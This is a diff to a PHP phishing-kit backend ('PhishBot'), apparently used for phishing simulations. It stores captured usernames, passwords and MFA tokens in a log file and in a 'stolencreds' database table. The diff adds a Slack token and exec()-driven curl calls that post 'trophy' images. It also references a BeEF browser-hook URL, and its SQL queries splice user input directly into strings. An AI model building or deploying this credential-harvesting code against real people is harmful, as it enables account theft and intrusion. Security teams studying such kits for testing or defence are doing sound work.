@@ -1,13 +1,14 @@
 <?php
 
 // Set Slack Webhook URL
-$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_HERE";
-$slackchannel = "#YOUR_SLACK_CHANNEL_HERE";
+$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_URL";
+$slackchannel = "#YOUR_SLACK_CHANNEL";
 $slackemoji = ":fishing_pole_and_fish:";
 $slackbotname = "PhishBot";
+$SlackLegacyToken = "YOUR_SLACK_LEGACY_TOKEN";
 
 // Set Optional BEEF Hook URL
-//$BEEFUrl = "https://YOUR_URL:3000/hook.js";
+//$BEEFUrl = "https://pondurancelab.com:3000/hook.js";
 $BEEFUrl = "";
 
 // Receives Required Parameters and Sets Variables
@@ -44,12 +45,41 @@ $txt = $user." ".$pass."\n\r\n\r";
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
 
-// Inserts Captured Information Into MySQL DB
-$sql = "INSERT INTO stolencreds(username,password,entered,ip,location,token) VALUES('$user','$pass',NOW(),'$ip','$portal','$MFAToken');";
-$result = $conn->query($sql);
+// Checks Trophy Awards
+$sqltrophy = "CALL GetAwards('$portal','$user');";
+$resulttrophy = $conn->query($sqltrophy);
+
+while($row = $resulttrophy->fetch_assoc()) {
+
+if($row["Title"] == "MostDedicated"){
+$cmdtrophy = "curl -F file=@TrophyMostDedicated.gif -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+exec($cmdtrophy);
+}
+
+
+if($row["Title"] == "MostDelayed"){
+$cmdtrophy = "curl -F file=@TrophyMostDelayed.gif -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+exec($cmdtrophy);
+}
+
+if($row["Title"] == "MostDisclosedPWs"){
+$cmdtrophy = "curl -F file=@TrophyMostDisclosed.gif -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+exec($cmdtrophy);
+}
+
+}
 
 printf($conn->error);
 $conn->close();
+
+$conn2 = mysqli_connect($servername, $username, $password, $dbname);
+
+// Inserts Captured Information Into MySQL DB
+$sql = "INSERT INTO stolencreds(username,password,entered,ip,location,token) VALUES('$user','$pass',NOW(),'$ip','$portal','$MFAToken');";
+$result = $conn2->query($sql);
+
+printf($conn2->error);
+$conn2->close();
 
 }
 
